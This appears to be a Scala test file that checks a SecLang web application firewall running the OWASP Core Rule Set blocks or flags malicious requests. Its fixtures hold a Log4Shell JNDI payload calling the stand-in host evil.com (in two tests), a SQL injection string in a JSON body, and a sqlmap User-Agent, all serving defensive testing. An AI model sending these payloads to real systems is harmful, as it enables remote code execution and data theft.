package com.cloud.apim.seclang.coreruleset.tests


import munit.FunSuite

import java.util

class CRSTest extends FunSuite {
  test("crs scala") {

    import com.cloud.apim.seclang.model._
    import com.cloud.apim.seclang.scaladsl._
    import com.cloud.apim.seclang.scaladsl.coreruleset.EmbeddedCRSPreset

    val presets = Map(
      "crs" -> EmbeddedCRSPreset.embedded
    )
    val factory = SecLang.factory(presets)
    val engine = factory.engine(List(
      "@import_preset crs",
      "SecRuleEngine On"
    ))

    val passing_ctx = RequestContext(
      method = "GET",
      uri = "/",
      headers = Headers(Map(
        "Host" -> List("www.owasp.org"),
        "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
      ))
    )
    val passing_res = engine.evaluate(passing_ctx, phases = List(1, 2)).displayPrintln()

    val failing_ctx = RequestContext(
      method = "GET",
      uri = "/",
      headers = Headers(Map(
        "Host" -> List("www.foo.bar"),
        "Apikey" -> List("${jndi:ldap://evil.com/a}"),
        "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
      )),
      query = Map("q" -> List("test")),
      body = None
    )
    val failing_res = engine.evaluate(failing_ctx, phases = List(1, 2)).displayPrintln()

    assertEquals(passing_res.disposition, Disposition.Continue)
    assertEquals(failing_res.disposition, Disposition.Block(400, Some("Potential Remote Command Execution: Log4j / Log4shell"), Some(944150)))
  }

  test("crs inspects a +json body like a json one") {

    import com.cloud.apim.seclang.model._
    import com.cloud.apim.seclang.scaladsl._
    import com.cloud.apim.seclang.scaladsl.coreruleset.EmbeddedCRSPreset

    // rules 901360 and 901370 force the JSON body processor on these types: without it, an
    // injection in a JSON:API body got past every rule that reads ARGS
    val engine = SecLang.factory(Map("crs" -> EmbeddedCRSPreset.embedded)).engine(List("@import_preset crs", "SecRuleEngine On"))
    Seq("application/json", "application/vnd.api+json", "application/problem+json", "application/x-amz-json-1.1").foreach { ct =>
      val ctx = RequestContext(
        method = "POST",
        uri = "/api/comments",
        headers = Headers(Map(
          "Host" -> List("www.foo.bar"),
          "Content-Type" -> List(ct),
          "Content-Length" -> List("26"),
          "User-Agent" -> List("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"),
        )),
        body = Some(ByteString("""{"comment":"1' or 1=1--"}"""))
      )
      val res = engine.evaluate(ctx, phases = List(1, 2))
      assert(res.events.flatMap(_.ruleId).contains(942100), s"$ct: the injection in the body was not seen")
    }
  }

  test("crs rules reading a data file fire") {

    import com.cloud.apim.seclang.model._
    import com.cloud.apim.seclang.scaladsl._
    import com.cloud.apim.seclang.scaladsl.coreruleset.EmbeddedCRSPreset

    // the preset keys its data files by their path in the jar (/rules/scanners-user-agents.data), the
    // rules name them bare: before seclang-engine 2.5.1 none of these rules could ever match
    val engine = SecLang.factory(Map("crs" -> EmbeddedCRSPreset.embedded)).engine(List("@import_preset crs", "SecRuleEngine DetectionOnly"))
    val ctx    = RequestContext(
      method = "GET",
      uri = "/",
      headers = Headers(Map(
        "Host" -> List("www.foo.bar"),
        "Accept" -> List("*/*"),
        "User-Agent" -> List("sqlmap/1.7.2#stable (https://sqlmap.org)"),
      ))
    )
    val res = engine.evaluate(ctx, phases = List(1, 2))
    assert(res.events.flatMap(_.ruleId).contains(913100), s"913100 did not fire: ${res.events.flatMap(_.ruleId)}")
  }

  test("crs loads exactly one setup file") {

    import com.cloud.apim.seclang.model._
    import com.cloud.apim.seclang.scaladsl.coreruleset.EmbeddedCRSPreset

    // 900990 is the SecAction that sets tx.crs_setup_version: there is one per setup file loaded
    val program = EmbeddedCRSPreset.embedded.program
    val setups = (1 to 5).flatMap(program.itemsForPhase).count {
      case item: ActionItem => item.id.contains(900990)
      case _                => false
    }
    assertEquals(setups, 1)
  }

  test("crs java") {

    import com.cloud.apim.seclang.model._
    import com.cloud.apim.seclang.javadsl._
    import com.cloud.apim.seclang.javadsl.coreruleset.EmbeddedCRSPreset

    val presets = new util.HashMap[String, JSecLangPreset]()
    presets.put("crs", EmbeddedCRSPreset.embedded)

    val factory = SecLang.factory(presets)
    val engine = factory.engine(java.util.List.of(
      "@import_preset crs",
      "SecRuleEngine On",
    ))

    val passing_ctx = JRequestContext
      .builder()
      .method("GET")
      .uri("/")
      .header("Host", "www.owasp.org")
      .header("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")
      .build()

    val passing_res = engine.evaluate(passing_ctx, java.util.List.of(1, 2)).displayPrintln()

    val failing_ctx = JRequestContext
      .builder()
      .method("GET")
      .uri("/")
      .header("Host", "www.owasp.org")
      .header("Apikey", "${jndi:ldap://evil.com/a}")
      .header("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")
      .build()

    val failing_res = engine.evaluate(failing_ctx, java.util.List.of(1, 2)).displayPrintln()

    assertEquals(passing_res.getDisposition, JDisposition.continueRequest())
    assertEquals(failing_res.getDisposition, JDisposition.fromScala(Disposition.Block(400, Some("Potential Remote Command Execution: Log4j / Log4shell"), Some(944150))))
  }
}
